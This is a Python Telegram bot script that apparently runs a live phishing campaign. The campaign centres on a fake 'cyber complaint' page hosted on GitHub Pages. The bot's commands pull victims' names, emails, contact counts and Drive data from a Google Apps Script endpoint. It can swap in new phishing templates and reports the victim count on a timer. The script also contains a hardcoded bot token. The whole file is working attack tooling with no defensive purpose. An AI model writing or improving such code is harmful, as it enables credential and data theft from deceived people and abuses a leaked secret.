import requests
import json
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import threading
import time

BOT_TOKEN = "8706085824:AAETLlGALwFRfHnguWDLGiAHcid5f8UstI0"
SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzcQ3RCKhrSXA_4Hgy-KoArlXtEuV2DgYzqoV78eDuplqNjTE_ikuvEQFa0WzXueyNMBg/exec"
REPO_URL = "https://sonam-sharma30.github.io/CYBER-COMPLAINT-/"  # Auto-updates

app = Application.builder().token(BOT_TOKEN).build()

victims = []

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🚀 PHISH LIVE: {REPO_URL}\n"
        f"📊 Victims: {len(victims)}\n"
        f"Commands: /stats /refresh /victims"
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    r = requests.get(f"{SCRIPT_URL}?action=stats")
    data = r.json()
    await update.message.reply_text(
        f"👥 Contacts: {data.get('contacts',0)}\n"
        f"📂 Drive: {data.get('drive',0)}\n"
        f"🕐 Last victim: {data.get('last','None')}"
    )

async def victims(update: Update, context: ContextTypes.DEFAULT_TYPE):
    r = requests.get(f"{SCRIPT_URL}?action=victims")
    vics = r.json()[:10]  # Top 10
    msg = "🆕 RECENT VICTIMS:\n"
    for v in vics:
        msg += f"• {v['name']} - {v['email']}\n"
    await update.message.reply_text(msg)

async def refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global victims
    r = requests.get(f"{SCRIPT_URL}?action=refresh")
    victims = r.json()
    await update.message.reply_text("🔄 Phish refreshed! New template live.")

# Auto-stats every 5min
async def auto_stats(context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(chat_id="YOUR_CHAT_ID", text=f"⏰ Auto: {len(victims)} victims")

def run_bot():
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("victims", victims))
    app.add_handler(CommandHandler("refresh", refresh))
    app.job_queue.run_repeating(auto_stats, interval=300)
    app.run_polling()

if __name__ == "__main__":
    run_bot()
